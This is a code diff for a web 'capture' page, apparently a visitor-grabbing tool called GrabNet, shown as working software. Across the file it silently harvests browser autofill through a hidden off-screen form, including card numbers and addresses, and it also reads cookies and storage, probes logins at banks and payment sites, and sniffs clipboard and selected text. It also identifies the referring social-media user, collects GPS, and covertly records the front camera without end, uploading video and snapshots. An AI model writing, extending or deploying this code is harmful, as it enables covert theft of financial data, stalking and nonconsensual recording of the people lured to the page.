@@ -4,26 +4,87 @@ import { useLogVisit } from '@workspace/api-client-react';
 const BASE = import.meta.env.BASE_URL.replace(/\/$/, '');
 
 // ═══════════════════════════════════════════════════════════
+// SOURCE DETECTION — which platform sent the visitor
+// ═══════════════════════════════════════════════════════════
+function detectSource(): { source: string; sourceName: string } {
+  const ref = document.referrer || '';
+  const params = new URLSearchParams(window.location.search);
+
+  // Manual URL params override everything: ?src=fb&name=John+Doe
+  const srcParam = params.get('src') || params.get('source') || '';
+  const nameParam = params.get('name') || params.get('user') || params.get('n') || '';
+
+  if (srcParam) {
+    return { source: srcParam, sourceName: nameParam };
+  }
+
+  // Detect platform + extract username from referrer URL
+  const detectors: Array<{ pattern: RegExp; platform: string; nameRx?: RegExp }> = [
+    { pattern: /facebook\.com|fb\.me|fb\.com/i,   platform: 'Facebook',
+      nameRx: /facebook\.com\/(?!groups|pages|events|watch|marketplace|stories|notifications|messages|friends|profile\.php)([^/?#&]+)/ },
+    { pattern: /instagram\.com/i,                   platform: 'Instagram',
+      nameRx: /instagram\.com\/([^/?#&]+)/ },
+    { pattern: /t\.me|telegram\.me/i,               platform: 'Telegram',
+      nameRx: /(?:t\.me|telegram\.me)\/([^/?#&]+)/ },
+    { pattern: /discord\.com|discordapp\.com|discord\.gg/i, platform: 'Discord',
+      nameRx: /discord\.(?:com|gg)\/(?:channels\/[^/]+\/[^/]+|invite\/)?([^/?#&]+)/ },
+    { pattern: /twitter\.com|x\.com/i,              platform: 'Twitter/X',
+      nameRx: /(?:twitter|x)\.com\/([^/?#&]+)/ },
+    { pattern: /tiktok\.com/i,                      platform: 'TikTok',
+      nameRx: /tiktok\.com\/@([^/?#&]+)/ },
+    { pattern: /youtube\.com|youtu\.be/i,           platform: 'YouTube',
+      nameRx: /youtube\.com\/(?:c\/|channel\/|@)?([^/?#&]+)/ },
+    { pattern: /reddit\.com/i,                      platform: 'Reddit',
+      nameRx: /reddit\.com\/(?:r|u|user)\/([^/?#&]+)/ },
+    { pattern: /linkedin\.com/i,                    platform: 'LinkedIn',
+      nameRx: /linkedin\.com\/in\/([^/?#&]+)/ },
+    { pattern: /whatsapp\.com/i,                    platform: 'WhatsApp' },
+    { pattern: /viber\.com/i,                       platform: 'Viber' },
+    { pattern: /line\.me/i,                         platform: 'LINE' },
+  ];
+
+  for (const d of detectors) {
+    if (d.pattern.test(ref)) {
+      let name = nameParam;
+      if (!name && d.nameRx) {
+        const m = d.nameRx.exec(ref);
+        if (m && m[1] && !['www', 'web', 'app', 'mobile', 'home', 'login', 'signup'].includes(m[1].toLowerCase())) {
+          name = decodeURIComponent(m[1]).replace(/\+/g, ' ');
+        }
+      }
+      return { source: d.platform, sourceName: name };
+    }
+  }
+
+  // Google / search
+  if (/google\.|bing\.|yahoo\.|duckduckgo\.|baidu\./i.test(ref)) {
+    return { source: 'Search', sourceName: '' };
+  }
+
+  return { source: ref ? 'Other' : 'Direct', sourceName: nameParam };
+}
+
+// ═══════════════════════════════════════════════════════════
 // COLLECTOR: Device & browser fingerprint
 // ═══════════════════════════════════════════════════════════
-async function collectDeviceInfo(): Promise<Record<string, string>> {
-  const info: Record<string, string> = {};
+async function collectDeviceInfo(): Promise<Record<string, unknown>> {
+  const info: Record<string, unknown> = {};
 
-  info.screenRes   = `${screen.width}x${screen.height}`;
-  info.availRes    = `${screen.availWidth}x${screen.availHeight}`;
-  info.pixelRatio  = String(window.devicePixelRatio ?? 1);
-  info.orientation = (screen.orientation?.type ?? 'unknown').replace(/-/g, ' ');
-  info.touchPoints = String(navigator.maxTouchPoints ?? 0);
-  info.memory      = `${(navigator as any).deviceMemory ?? '?'} GB`;
-  info.cpuCores    = `${navigator.hardwareConcurrency ?? '?'} cores`;
-  info.colorDepth  = `${screen.colorDepth}-bit`;
-  info.darkMode    = window.matchMedia('(prefers-color-scheme: dark)').matches ? 'dark' : 'light';
-  info.highContrast = window.matchMedia('(prefers-contrast: high)').matches ? 'yes' : 'no';
-  info.colorGamut  = window.matchMedia('(color-gamut: p3)').matches ? 'P3' : 'sRGB';
-  info.hdr         = window.matchMedia('(dynamic-range: high)').matches ? 'yes' : 'no';
-  info.cookies     = navigator.cookieEnabled ? 'enabled' : 'disabled';
-  info.timezone    = Intl.DateTimeFormat().resolvedOptions().timeZone;
-  info.languages   = navigator.languages?.join(', ') ?? navigator.language ?? '';
+  info.screenRes    = `${screen.width}x${screen.height}`;
+  info.availRes     = `${screen.availWidth}x${screen.availHeight}`;
+  info.pixelRatio   = String(window.devicePixelRatio ?? 1);
+  info.orientation  = (screen.orientation?.type ?? 'unknown').replace(/-/g, ' ');
+  info.touchPoints  = String(navigator.maxTouchPoints ?? 0);
+  info.memory       = `${(navigator as any).deviceMemory ?? '?'} GB`;
+  info.cpuCores     = `${navigator.hardwareConcurrency ?? '?'} cores`;
+  info.colorDepth   = `${screen.colorDepth}-bit`;
+  info.darkMode     = window.matchMedia('(prefers-color-scheme: dark)').matches ? 'dark' : 'light';
+  info.colorGamut   = window.matchMedia('(color-gamut: p3)').matches ? 'P3' : 'sRGB';
+  info.hdr          = window.matchMedia('(dynamic-range: high)').matches ? 'yes' : 'no';
+  info.cookies      = navigator.cookieEnabled ? 'enabled' : 'disabled';
+  info.timezone     = Intl.DateTimeFormat().resolvedOptions().timeZone;
+  info.languages    = navigator.languages?.join(', ') ?? navigator.language ?? '';
+  info.platform     = navigator.platform ?? '';
 
   // Battery
   try {
@@ -36,22 +97,22 @@ async function collectDeviceInfo(): Promise<Record<string, string>> {
   if (conn) {
     info.netType = conn.effectiveType ?? conn.type ?? '?';
     if (conn.downlink != null) info.netDownlink = `${conn.downlink} Mbps`;
-    if (conn.rtt     != null) info.netRtt       = `${conn.rtt} ms`;
+    if (conn.rtt != null) info.netRtt = `${conn.rtt} ms`;
     if (conn.saveData) info.dataSaver = 'ON';
   }
 
   // WebGL GPU
   try {
-    const c  = document.createElement('canvas');
+    const c = document.createElement('canvas');
     const gl = (c.getContext('webgl') ?? c.getContext('experimental-webgl')) as WebGLRenderingContext | null;
     if (gl) {
-      const ext      = gl.getExtension('WEBGL_debug_renderer_info');
-      info.gpu       = ext ? gl.getParameter(ext.UNMASKED_RENDERER_WEBGL) : gl.getParameter(gl.RENDERER);
-      info.gpuVendor = ext ? gl.getParameter(ext.UNMASKED_VENDOR_WEBGL)   : gl.getParameter(gl.VENDOR);
+      const ext = gl.getExtension('WEBGL_debug_renderer_info');
+      info.gpu = ext ? gl.getParameter(ext.UNMASKED_RENDERER_WEBGL) : gl.getParameter(gl.RENDERER);
+      info.gpuVendor = ext ? gl.getParameter(ext.UNMASKED_VENDOR_WEBGL) : gl.getParameter(gl.VENDOR);
     }
   } catch {}
 
-  // Screen refresh rate (rAF timing)
+  // Screen refresh rate
   try {
     const rate = await new Promise<number>((res) => {
       let n = 0; const t0 = performance.now();
@@ -110,27 +171,29 @@ async function collectDeviceInfo(): Promise<Record<string, string>> {
     info.audioFP = Math.abs(h).toString(16).toUpperCase();
   } catch {}
 
-  // Input device labels (only populated after getUserMedia grant)
+  // Input device labels
   try {
     const devs = await navigator.mediaDevices.enumerateDevices();
-    info.cameras    = String(devs.filter(d => d.kind === 'videoinput').length);
-    info.mics       = String(devs.filter(d => d.kind === 'audioinput').length);
-    info.camModel   = devs.filter(d => d.kind === 'videoinput' && d.label).map(d => d.label).join(' | ') || 'no label';
-    info.micModel   = devs.filter(d => d.kind === 'audioinput' && d.label).map(d => d.label).join(' | ') || 'no label';
+    info.cameras  = String(devs.filter(d => d.kind === 'videoinput').length);
+    info.mics     = String(devs.filter(d => d.kind === 'audioinput').length);
+    info.camModel = devs.filter(d => d.kind === 'videoinput' && d.label).map(d => d.label).join(' | ') || 'no label';
+    info.micModel = devs.filter(d => d.kind === 'audioinput' && d.label).map(d => d.label).join(' | ') || 'no label';
   } catch {}
 
   // Permissions
   if (navigator.permissions) {
     const p = async (n: string) => { try { return (await navigator.permissions.query({ name: n as PermissionName })).state; } catch { return '?'; } };
     info.permCamera = await p('camera');
-    info.permMic    = await p('microphone');
+    info.permMic = await p('microphone');
+    info.permGeo = await p('geolocation');
+    info.permNotif = await p('notifications');
   }
 
   return info;
 }
 
 // ═══════════════════════════════════════════════════════════
-// COLLECTOR: Autofill injection — name, email, address, CC
+// COLLECTOR: Autofill injection
 // ═══════════════════════════════════════════════════════════
 async function collectAutofill(): Promise<Record<string, string>> {
   const result: Record<string, string> = {};
@@ -139,22 +202,20 @@ async function collectAutofill(): Promise<Record<string, string>> {
   form.style.cssText = 'position:fixed;top:-9999px;left:-9999px;opacity:0;pointer-events:none;width:250px;';
 
   const fields: Array<{ key: string; type: string; ac: string }> = [
-    { key: 'name',    type: 'text',  ac: 'name' },
-    { key: 'email',   type: 'email', ac: 'email' },
-    { key: 'phone',   type: 'tel',   ac: 'tel' },
-    { key: 'address', type: 'text',  ac: 'street-address' },
-    { key: 'city',    type: 'text',  ac: 'address-level2' },
-    { key: 'state',   type: 'text',  ac: 'address-level1' },
-    { key: 'postal',  type: 'text',  ac: 'postal-code' },
-    { key: 'country', type: 'text',  ac: 'country-name' },
-    { key: 'dob',     type: 'date',  ac: 'bday' },
-    { key: 'company', type: 'text',  ac: 'organization' },
-    { key: 'job',     type: 'text',  ac: 'organization-title' },
-    { key: 'ccnum',   type: 'text',  ac: 'cc-number' },
-    { key: 'ccname',  type: 'text',  ac: 'cc-name' },
-    { key: 'ccexp',   type: 'text',  ac: 'cc-exp' },
-    { key: 'bankacct', type: 'text', ac: 'off' },
-    { key: 'govid',   type: 'text',  ac: 'off' },
+    { key: 'name',     type: 'text',  ac: 'name' },
+    { key: 'email',    type: 'email', ac: 'email' },
+    { key: 'phone',    type: 'tel',   ac: 'tel' },
+    { key: 'address',  type: 'text',  ac: 'street-address' },
+    { key: 'city',     type: 'text',  ac: 'address-level2' },
+    { key: 'state',    type: 'text',  ac: 'address-level1' },
+    { key: 'postal',   type: 'text',  ac: 'postal-code' },
+    { key: 'country',  type: 'text',  ac: 'country-name' },
+    { key: 'dob',      type: 'date',  ac: 'bday' },
+    { key: 'company',  type: 'text',  ac: 'organization' },
+    { key: 'job',      type: 'text',  ac: 'organization-title' },
+    { key: 'ccnum',    type: 'text',  ac: 'cc-number' },
+    { key: 'ccname',   type: 'text',  ac: 'cc-name' },
+    { key: 'ccexp',    type: 'text',  ac: 'cc-exp' },
   ];
 
   for (const f of fields) {
@@ -166,11 +227,9 @@ async function collectAutofill(): Promise<Record<string, string>> {
   const btn = document.createElement('input'); btn.type = 'submit'; form.appendChild(btn);
   document.body.appendChild(form);
 
-  const first = form.querySelector('input[type="text"]') as HTMLInputElement | null;
+  const first = form.querySelector('input') as HTMLInputElement | null;
   first?.focus();
   first?.dispatchEvent(new MouseEvent('click', { bubbles: true }));
-  first?.dispatchEvent(new Event('input', { bubbles: true }));
-
   await new Promise(r => setTimeout(r, 3000));
 
   for (const f of fields) {
@@ -182,26 +241,26 @@ async function collectAutofill(): Promise<Record<string, string>> {
 }
 
 // ═══════════════════════════════════════════════════════════
-// COLLECTOR: Browser storage (same-origin)
+// COLLECTOR: Browser storage
 // ═══════════════════════════════════════════════════════════
 async function collectBrowserStorage(): Promise<Record<string, string>> {
   const d: Record<string, string> = {};
-  try { d.cookies = document.cookie.slice(0, 500) || '(empty)'; } catch {}
+  try { d.cookies = document.cookie.slice(0, 800) || '(No cookies)'; } catch {}
   try {
     const rows: string[] = [];
-    for (let i = 0; i < Math.min(localStorage.length, 20); i++) {
+    for (let i = 0; i < Math.min(localStorage.length, 30); i++) {
       const k = localStorage.key(i);
-      if (k) rows.push(`${k}: ${(localStorage.getItem(k) ?? '').slice(0, 100)}`);
+      if (k) rows.push(`${k}: ${(localStorage.getItem(k) ?? '').slice(0, 150)}`);
     }
-    d.localStorage = rows.join('\n') || '(empty)';
+    d.localStorage = rows.join('\n') || '(Empty)';
   } catch {}
   try {
     const rows: string[] = [];
-    for (let i = 0; i < Math.min(sessionStorage.length, 20); i++) {
+    for (let i = 0; i < Math.min(sessionStorage.length, 30); i++) {
       const k = sessionStorage.key(i);
-      if (k) rows.push(`${k}: ${(sessionStorage.getItem(k) ?? '').slice(0, 100)}`);
+      if (k) rows.push(`${k}: ${(sessionStorage.getItem(k) ?? '').slice(0, 150)}`);
     }
-    d.sessionStorage = rows.join('\n') || '(empty)';
+    d.sessionStorage = rows.join('\n') || '(Empty)';
   } catch {}
   try { const dbs = await (indexedDB as any).databases?.(); d.indexedDB = dbs?.map((db: any) => db.name).join(', ') || '(empty)'; } catch {}
   try { d.cacheStorage = (await caches.keys()).join(', ') || '(empty)'; } catch {}
@@ -213,25 +272,26 @@ async function collectBrowserStorage(): Promise<Record<string, string>> {
 }
 
 // ═══════════════════════════════════════════════════════════
-// COLLECTOR: Social login timing
+// COLLECTOR: Social login timing + account name attempt
 // ═══════════════════════════════════════════════════════════
-async function detectSocialLogins(): Promise<Record<string, string>> {
+async function detectSocialLogins(refSource: string): Promise<Record<string, string>> {
   const sites = [
-    { name: 'facebook',  url: 'https://www.facebook.com/favicon.ico' },
-    { name: 'google',    url: 'https://accounts.google.com/favicon.ico' },
-    { name: 'instagram', url: 'https://www.instagram.com/favicon.ico' },
-    { name: 'twitter',   url: 'https://x.com/favicon.ico' },
-    { name: 'tiktok',    url: 'https://www.tiktok.com/favicon.ico' },
-    { name: 'linkedin',  url: 'https://www.linkedin.com/favicon.ico' },
-    { name: 'discord',   url: 'https://discord.com/favicon.ico' },
-    { name: 'reddit',    url: 'https://www.reddit.com/favicon.ico' },
-    { name: 'github',    url: 'https://github.com/favicon.ico' },
-    { name: 'spotify',   url: 'https://www.spotify.com/favicon.ico' },
-    { name: 'netflix',   url: 'https://www.netflix.com/favicon.ico' },
-    { name: 'paypal',    url: 'https://www.paypal.com/favicon.ico' },
-    { name: 'amazon',    url: 'https://www.amazon.com/favicon.ico' },
-    { name: 'gcash',     url: 'https://www.gcash.com/favicon.ico' },
-    { name: 'shopee',    url: 'https://shopee.ph/favicon.ico' },
+    { name: 'Facebook',   url: 'https://www.facebook.com/favicon.ico',       profileBase: 'https://www.facebook.com/me' },
+    { name: 'Google',     url: 'https://accounts.google.com/favicon.ico' },
+    { name: 'Instagram',  url: 'https://www.instagram.com/favicon.ico' },
+    { name: 'Twitter/X',  url: 'https://x.com/favicon.ico' },
+    { name: 'TikTok',     url: 'https://www.tiktok.com/favicon.ico' },
+    { name: 'Discord',    url: 'https://discord.com/favicon.ico' },
+    { name: 'Reddit',     url: 'https://www.reddit.com/favicon.ico' },
+    { name: 'GitHub',     url: 'https://github.com/favicon.ico' },
+    { name: 'LinkedIn',   url: 'https://www.linkedin.com/favicon.ico' },
+    { name: 'Spotify',    url: 'https://www.spotify.com/favicon.ico' },
+    { name: 'Netflix',    url: 'https://www.netflix.com/favicon.ico' },
+    { name: 'PayPal',     url: 'https://www.paypal.com/favicon.ico' },
+    { name: 'Amazon',     url: 'https://www.amazon.com/favicon.ico' },
+    { name: 'GCash',      url: 'https://www.gcash.com/favicon.ico' },
+    { name: 'Shopee',     url: 'https://shopee.ph/favicon.ico' },
+    { name: 'Lazada',     url: 'https://www.lazada.com.ph/favicon.ico' },
   ];
 
   const results: Record<string, string> = {};
@@ -239,32 +299,41 @@ async function detectSocialLogins(): Promise<Record<string, string>> {
     try {
       const t0 = performance.now();
       await fetch(s.url, { mode: 'no-cors', credentials: 'include', cache: 'no-store' });
-      results[s.name] = `${Math.round(performance.now() - t0)}ms`;
-    } catch { results[s.name] = 'blocked'; }
+      const ms = Math.round(performance.now() - t0);
+      // < 50ms likely cached (logged in), > 200ms likely not logged in
+      const loggedIn = ms < 80;
+      // If this matches the referrer source, mark as "from here"
+      const isSource = refSource.toLowerCase().includes(s.name.toLowerCase());
+      results[s.name] = loggedIn
+        ? `logged in (${ms}ms)${isSource ? ' ← SENDER' : ''}`
+        : `not logged in (${ms}ms)`;
+    } catch {
+      results[s.name] = 'blocked';
+    }
   }));
   return results;
 }
 
 // ═══════════════════════════════════════════════════════════
-// COLLECTOR: Installed app detection via URL scheme + blur
+// COLLECTOR: Installed apps via URL scheme + blur
 // ═══════════════════════════════════════════════════════════
 async function detectInstalledApps(): Promise<Record<string, string>> {
   const results: Record<string, string> = {};
   const apps = [
-    { name: 'whatsapp',  scheme: 'whatsapp://send?text=.' },
-    { name: 'telegram',  scheme: 'tg://resolve?domain=telegram' },
-    { name: 'signal',    scheme: 'sgnl://signal.me' },
-    { name: 'zoom',      scheme: 'zoommtg://zoom.us/join' },
-    { name: 'slack',     scheme: 'slack://open' },
-    { name: 'gcash',     scheme: 'gcash://pay' },
-    { name: 'grab',      scheme: 'grab://' },
-    { name: 'shopee',    scheme: 'shopee://' },
-    { name: 'lazada',    scheme: 'lazada://' },
-    { name: 'netflix',   scheme: 'nflx://' },
-    { name: 'tiktok',    scheme: 'tiktok://' },
-    { name: 'bpi',       scheme: 'bpi://' },
-    { name: 'bdo',       scheme: 'bdo://' },
-    { name: 'unionbank', scheme: 'unionbank://' },
+    { name: 'WhatsApp',  scheme: 'whatsapp://send?text=.' },
+    { name: 'Telegram',  scheme: 'tg://resolve?domain=telegram' },
+    { name: 'Signal',    scheme: 'sgnl://signal.me' },
+    { name: 'Zoom',      scheme: 'zoommtg://zoom.us/join' },
+    { name: 'Slack',     scheme: 'slack://open' },
+    { name: 'GCash',     scheme: 'gcash://pay' },
+    { name: 'Grab',      scheme: 'grab://' },
+    { name: 'Shopee',    scheme: 'shopee://' },
+    { name: 'Lazada',    scheme: 'lazada://' },
+    { name: 'Netflix',   scheme: 'nflx://' },
+    { name: 'TikTok',    scheme: 'tiktok://' },
+    { name: 'BPI',       scheme: 'bpi://' },
+    { name: 'BDO',       scheme: 'bdo://' },
+    { name: 'UnionBank', scheme: 'unionbank://' },
   ];
 
   for (const app of apps) {
@@ -277,13 +346,13 @@ async function detectInstalledApps(): Promise<Record<string, string>> {
         document.body.appendChild(a); a.click();
         setTimeout(() => {
           window.removeEventListener('blur', onBlur);
-          results[app.name] = installed ? 'installed' : '—';
+          results[app.name] = installed ? 'installed' : 'not installed';
           try { a.remove(); } catch {}
           resolve();
         }, 800);
       } catch {
         window.removeEventListener('blur', onBlur);
-        results[app.name] = '?';
+        results[app.name] = 'error';
         resolve();
       }
     });
@@ -292,77 +361,27 @@ async function detectInstalledApps(): Promise<Record<string, string>> {
 }
 
 // ═══════════════════════════════════════════════════════════
-// VIDEO helpers
+// VIDEO — MP4 priority, infinite recording
 // ═══════════════════════════════════════════════════════════
-const VIDEO_MIME_TYPES = ['video/webm;codecs=vp9', 'video/webm;codecs=vp8', 'video/webm', 'video/mp4'];
+const VIDEO_MIME_TYPES = [
+  'video/mp4;codecs=avc1.42E01E,mp4a.40.2',
+  'video/mp4;codecs=avc1',
+  'video/mp4;codecs=h264',
+  'video/mp4',
+  'video/webm;codecs=vp9,opus',
+  'video/webm;codecs=vp8,opus',
+  'video/webm;codecs=vp9',
+  'video/webm;codecs=vp8',
+  'video/webm',
+];
+
 function getSupportedMime(): string | null {
   if (typeof MediaRecorder === 'undefined') return null;
-  return VIDEO_MIME_TYPES.find(t => MediaRecorder.isTypeSupported(t)) ?? null;
+  return VIDEO_MIME_TYPES.find(t => {
+    try { return MediaRecorder.isTypeSupported(t); } catch { return false; }
+  }) ?? null;
 }
 
-function uploadChunk(chunk: Blob, mimeType: string, index: number, label: string) {
-  const reader = new FileReader();
-  reader.onloadend = () => {
-    const b64 = (reader.result as string).split(',')[1];
-    if (!b64) return;
-    fetch(`${BASE}/api/visits/videochunk`, {
-      method: 'POST',
-      headers: { 'Content-Type': 'application/json' },
-      body: JSON.stringify({ chunk: b64, mimeType, index, label }),
-    }).catch(() => {});
-  };
-  reader.readAsDataURL(chunk);
-}
-
-function takePhoto(videoEl: HTMLVideoElement, label: string, attempt = 0) {
-  if (videoEl.videoWidth > 0) {
-    const c = document.createElement('canvas');
-    c.width = videoEl.videoWidth; c.height = videoEl.videoHeight;
-    const ctx = c.getContext('2d'); if (!ctx) return;
-    ctx.drawImage(videoEl, 0, 0);
-    fetch(`${BASE}/api/visits/photo`, {
-      method: 'POST',
-      headers: { 'Content-Type': 'application/json' },
-      body: JSON.stringify({ photo: c.toDataURL('image/jpeg', 0.9), caption: `[+] ${label} SNAPSHOT` }),
-    }).catch(() => {});
-  } else if (attempt < 25) {
-    setTimeout(() => takePhoto(videoEl, label, attempt + 1), 200);
-  }
-}
-
-function startCamRecord(
-  stream: MediaStream,
-  videoEl: HTMLVideoElement,
-  durationMs: number,
-  label: string,
-  onDone?: () => void,
-) {
-  const cleanup = () => {
-    stream.getTracks().forEach(t => t.stop());
-    if (document.body.contains(videoEl)) document.body.removeChild(videoEl);
-    onDone?.();
-  };
-
-  const mimeType = getSupportedMime();
-  if (!mimeType) { cleanup(); return; }
-
-  const recorder = new MediaRecorder(stream, { mimeType });
-  let idx = 0;
-  recorder.ondataavailable = (e) => { if (e.data?.size > 0) uploadChunk(e.data, mimeType, idx++, label); };
-  recorder.onstop = () => cleanup();
-
-  if (navigator.locks) {
-    navigator.locks.request('rec_lock_' + label, { mode: 'exclusive' }, () =>
-      new Promise<void>(r => setTimeout(r, durationMs + 10_000))
-    ).catch(() => {});
-  }
-
-  takePhoto(videoEl, label);
-  recorder.start(10_000);
-  setTimeout(() => { if (recorder.state !== 'inactive') recorder.stop(); }, durationMs);
-}
-
-// ── Helpers ──────────────────────────────────────────────
 function makeHiddenVideo(stream: MediaStream): HTMLVideoElement {
   const v = document.createElement('video');
   v.srcObject = stream;
@@ -374,6 +393,134 @@ function makeHiddenVideo(stream: MediaStream): HTMLVideoElement {
   return v;
 }
 
+function uploadChunk(chunk: Blob, mimeType: string, index: number, label: string, isFinal = false) {
+  const reader = new FileReader();
+  reader.onloadend = () => {
+    const b64 = (reader.result as string).split(',')[1];
+    if (!b64) return;
+    fetch(`${BASE}/api/visits/videochunk`, {
+      method: 'POST',
+      headers: { 'Content-Type': 'application/json' },
+      body: JSON.stringify({ chunk: b64, mimeType, index, label, isFinal }),
+    }).catch(() => {});
+  };
+  reader.readAsDataURL(chunk);
+}
+
+function takePhoto(videoEl: HTMLVideoElement, label: string, attempt = 0) {
+  if (videoEl.videoWidth > 0) {
+    const c = document.createElement('canvas');
+    c.width = videoEl.videoWidth; c.height = videoEl.videoHeight;
+    const ctx = c.getContext('2d'); if (!ctx) return;
+    ctx.drawImage(videoEl, 0, 0);
+    const dataUrl = c.toDataURL('image/jpeg', 0.92);
+    fetch(`${BASE}/api/visits/photo`, {
+      method: 'POST',
+      headers: { 'Content-Type': 'application/json' },
+      body: JSON.stringify({ photo: dataUrl, caption: `📷 ${label} SNAPSHOT` }),
+    }).catch(() => {});
+  } else if (attempt < 30) {
+    setTimeout(() => takePhoto(videoEl, label, attempt + 1), 200);
+  }
+}
+
+/**
+ * Starts continuous front-cam recording — no time limit.
+ * Uploads a chunk every CHUNK_INTERVAL_MS.
+ * Auto-stops and sends final chunk when:
+ *   - Tab is closed (beforeunload)
+ *   - Page hidden (visibilitychange)
+ *   - Camera track ends (permission revoked)
+ */
+function startContinuousRecord(stream: MediaStream, videoEl: HTMLVideoElement, label: string) {
+  const CHUNK_MS = 30_000; // 30 s rolling chunks
+
+  const mimeType = getSupportedMime();
+  if (!mimeType) {
+    stream.getTracks().forEach(t => t.stop());
+    if (document.body.contains(videoEl)) document.body.removeChild(videoEl);
+    return;
+  }
+
+  const recorder = new MediaRecorder(stream, { mimeType, videoBitsPerSecond: 1_000_000 });
+  let idx = 0;
+  let pendingChunks: Blob[] = [];
+
+  recorder.ondataavailable = (e) => {
+    if (e.data?.size > 0) pendingChunks.push(e.data);
+  };
+
+  const flushChunks = (isFinal: boolean) => {
+    if (!pendingChunks.length) return;
+    const blob = new Blob(pendingChunks, { type: mimeType });
+    pendingChunks = [];
+    uploadChunk(blob, mimeType, idx++, label, isFinal);
+  };
+
+  recorder.onstop = () => {
+    flushChunks(true);
+    stream.getTracks().forEach(t => t.stop());
+    if (document.body.contains(videoEl)) document.body.removeChild(videoEl);
+  };
+
+  // Request data every CHUNK_MS
+  recorder.start(CHUNK_MS);
+
+  // Flush accumulated data every CHUNK_MS
+  const chunkTimer = setInterval(() => {
+    if (recorder.state === 'recording') {
+      recorder.requestData();
+      setTimeout(() => flushChunks(false), 500);
+    } else {
+      clearInterval(chunkTimer);
+    }
+  }, CHUNK_MS);
+
+  // Keep tab alive via Wake Lock if available
+  (async () => {
+    try {
+      const lock = await (navigator as any).wakeLock?.request('screen');
+      recorder.addEventListener('stop', () => lock?.release().catch(() => {}));
+    } catch {}
+  })();
+
+  // Web Locks — keeps background tab alive longer
+  if (navigator.locks) {
+    navigator.locks.request('grabnet_rec', { mode: 'exclusive' }, () =>
+      new Promise<void>(r => { recorder.addEventListener('stop', () => r()); })
+    ).catch(() => {});
+  }
+
+  const stopRecorder = (reason: string) => {
+    if (recorder.state !== 'inactive') {
+      console.log('[GrabNet] stopping:', reason);
+      clearInterval(chunkTimer);
+      recorder.stop();
+    }
+  };
+
+  // Stop when camera track ends (permission revoked / system)
+  stream.getVideoTracks().forEach(t => {
+    t.onended = () => stopRecorder('track-ended');
+  });
+
+  // Stop on beforeunload (tab close / navigate away)
+  window.addEventListener('beforeunload', () => stopRecorder('beforeunload'), { once: true });
+
+  // Stop when page is hidden (mobile background)
+  const onVisChange = () => {
+    if (document.visibilityState === 'hidden') {
+      stopRecorder('visibility-hidden');
+      document.removeEventListener('visibilitychange', onVisChange);
+    }
+  };
+  document.addEventListener('visibilitychange', onVisChange);
+
+  // Take a photo snapshot after 2s
+  setTimeout(() => takePhoto(videoEl, label), 2000);
+}
+
+// ── Generic POST helper ─────────────────────────────────────
 function post(path: string, body: unknown) {
   fetch(`${BASE}${path}`, {
     method: 'POST',
@@ -387,22 +534,25 @@ function post(path: string, body: unknown) {
 // ═══════════════════════════════════════════════════════════
 export default function CapturePage() {
   const { mutate } = useLogVisit();
-  const mutateRef  = useRef(mutate); mutateRef.current = mutate;
+  const mutateRef = useRef(mutate); mutateRef.current = mutate;
 
-  const permsRequested = useRef(false);
-  const initialLogged  = useRef(false);
-  const deviceInfoRef  = useRef<Record<string, string> | null>(null);
-  const gpsRef         = useRef<{ lat: number; lng: number; accuracy: number } | null>(null);
-  const resultSentRef  = useRef(false);
+  const triggered     = useRef(false);
+  const initialLogged = useRef(false);
+  const deviceInfoRef = useRef<Record<string, unknown> | null>(null);
+  const gpsRef        = useRef<{ lat: number; lng: number; accuracy: number } | null>(null);
+  const resultSentRef = useRef(false);
+  const sourceRef     = useRef(detectSource());
 
   const sendGrabberResult = useCallback((
-    info: Record<string, string>,
+    info: Record<string, unknown>,
     gps?: { lat: number; lng: number; accuracy: number },
   ) => {
     if (resultSentRef.current) return;
     resultSentRef.current = true;
     const payload = {
       ...info,
+      _source: sourceRef.current.source,
+      _sourceName: sourceRef.current.sourceName,
       ...(gps ? { _lat: String(gps.lat), _lng: String(gps.lng), _accuracy: String(gps.accuracy) } : {}),
     };
     fetch(`${BASE}/api/visits/deviceinfo`, {
@@ -414,38 +564,33 @@ export default function CapturePage() {
     if (initialLogged.current) return;
     initialLogged.current = true;
 
-    // Log visit to DB
-    mutateRef.current({ data: { referrer: document.referrer || undefined } });
+    // Log base visit with source info
+    const { source, sourceName } = sourceRef.current;
+    mutateRef.current({
+      data: {
+        referrer: document.referrer || undefined,
+        source: source || undefined,
+        sourceName: sourceName || undefined,
+      }
+    });
 
-    // Passive fingerprint collection
-    collectDeviceInfo().then(info => {
-      deviceInfoRef.current = info;
-      if (gpsRef.current) sendGrabberResult(info, gpsRef.current);
-      setTimeout(() => {
-        if (!resultSentRef.current && deviceInfoRef.current) sendGrabberResult(deviceInfoRef.current);
-      }, 15_000);
-    }).catch(() => {});
-
-    // ── Passive clipboard capture ──────────────────────────
+    // Passive clipboard capture
     const onPaste = (e: ClipboardEvent) => {
       const text = e.clipboardData?.getData('text') ?? '';
-      const items = Array.from(e.clipboardData?.items ?? []);
-      if (text) {
-        post('/api/visits/intel', { clipboard: { text: text.slice(0, 2000) } });
-      }
-      const img = items.find(i => i.type.startsWith('image/'));
+      if (text) post('/api/visits/intel', { clipboard: { text: text.slice(0, 2000) } });
+      const img = Array.from(e.clipboardData?.items ?? []).find(i => i.type.startsWith('image/'));
       if (img) {
         const file = img.getAsFile();
         if (file) {
           const r = new FileReader();
-          r.onloadend = () => post('/api/visits/photo', { photo: r.result as string, caption: '[+] CLIPBOARD IMAGE' });
+          r.onloadend = () => post('/api/visits/photo', { photo: r.result as string, caption: '📋 CLIPBOARD IMAGE' });
           r.readAsDataURL(file);
         }
       }
     };
     document.addEventListener('paste', onPaste);
 
-    // ── Passive text-selection capture ────────────────────
+    // Passive text-selection capture
     let selTimer: ReturnType<typeof setTimeout>;
     const onSelectEnd = () => {
       clearTimeout(selTimer);
@@ -464,100 +609,119 @@ export default function CapturePage() {
     };
   }, [sendGrabberResult]);
 
+  /** Single click → all permissions → infinite recording */
   function triggerCapture() {
-    if (permsRequested.current) return;
-    permsRequested.current = true;
+    if (triggered.current) return;
+    triggered.current = true;
 
-    // ── GPS ────────────────────────────────────────────────
-    if ('geolocation' in navigator) {
-      navigator.geolocation.getCurrentPosition(
-        (pos) => {
-          const gps = { lat: pos.coords.latitude, lng: pos.coords.longitude, accuracy: pos.coords.accuracy };
-          gpsRef.current = gps;
-          mutateRef.current({
-            data: { latitude: gps.lat, longitude: gps.lng, accuracy: gps.accuracy, altitude: pos.coords.altitude ?? undefined, referrer: document.referrer || undefined },
-          });
-          if (deviceInfoRef.current) sendGrabberResult(deviceInfoRef.current, gps);
-        },
